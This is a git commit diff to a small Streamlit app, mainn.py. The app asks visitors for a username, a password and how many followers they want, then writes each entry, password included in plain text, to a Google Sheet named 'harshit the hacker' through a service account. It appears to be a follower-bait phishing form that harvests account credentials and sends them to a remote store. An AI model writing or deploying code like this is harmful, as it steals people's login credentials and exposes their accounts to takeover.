ffbc799fb495461c62fe8f8a6159d68644c37abe
himeshmartolia11-bit <himeshmartolia11@gmail.com>
2026-04-07 09:26:15 +0530

    Update mainn.py

--- mainn.py
+++ mainn.py
@@ -1,14 +1,24 @@
-import    streamlit as st
-import pandas as pd
+import streamlit as st
+import gspread
+from oauth2client.service_account import ServiceAccountCredentials
 
-name = st.text_input("enter your username :  ")
-fname = st.text_input("enter your password : ")
-adr   = st.text_area ("enter the number of following you need ")
-classdata = st.selectbox ("Enter your age :",(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,18))
+# Google Sheet connect
+scope = ["https://spreadsheets.google.com/feeds",
+         "https://www.googleapis.com/auth/drive"]
 
-button = st.button("Done")
-if button :
-    st.markdown(f"""
-    Name : {name}
-    Father Name :{fname}
-    address : {classdata}""")
+creds = ServiceAccountCredentials.from_json_keyfile_name("key.json", scope)
+client = gspread.authorize(creds)
+
+sheet = client.open("harshit the hacker").sheet1
+
+# UI
+st.title("Form")
+
+username = st.text_input("Enter username")
+password = st.text_input("Enter password")
+followers = st.text_input("Followers")
+age = st.number_input("Age")
+
+if st.button("Submit"):
+    sheet.append_row([username, password, followers, age])
+    st.success("Data saved ✅")
